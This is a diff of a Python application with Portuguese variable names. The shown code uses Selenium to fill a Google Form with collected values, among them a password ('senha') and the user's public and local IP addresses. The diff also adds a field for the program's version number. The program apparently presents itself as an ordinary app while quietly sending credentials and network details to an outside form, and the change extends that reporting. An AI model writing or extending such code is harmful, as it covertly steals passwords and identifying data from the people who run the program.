@@ -4,7 +4,7 @@ from tqdm import tqdm
 import requests
 import socket
 
-icone = icon='tux-natal.ico'
+versao = '2.1.3'
 navegador = Internet()
 
 class app:
@@ -937,10 +937,15 @@ if __name__ == '__main__':
         formulario = 'https://forms.gle/gQzJ6Th817BGSZyY9'
         time.sleep(1)
         driver.get(formulario)
-        #preencher email
+        #preencher email e ips
         wdw.until(element_to_be_clickable(('xpath', '/html/body/div/div[2]/form/div[2]/div/div[2]/div/div/div/div[2]/div/div[1]/div[2]/textarea')))
         driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div/div/div/div[2]/div/div[1]/div[2]/textarea').clear()
         driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div/div/div/div[2]/div/div[1]/div[2]/textarea').send_keys(info,'\n',tr,'\n',senha,'\n','Ip publico: ',ip_publico,'\n','Ip local: ',ip_local)
+
+        wdw.until(element_to_be_clickable(('xpath', '/html/body/div/div[2]/form/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[2]/textarea')))
+        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[2]/textarea').clear()
+        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[2]/textarea').send_keys(versao)
+
         #sim
         wdw.until(element_to_be_clickable(('xpath', '/html/body/div/div[2]/form/div[2]/div/div[3]/div[1]/div[1]/div/span/span')))
         driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[3]/div[1]/div[1]/div/span/span').click()    
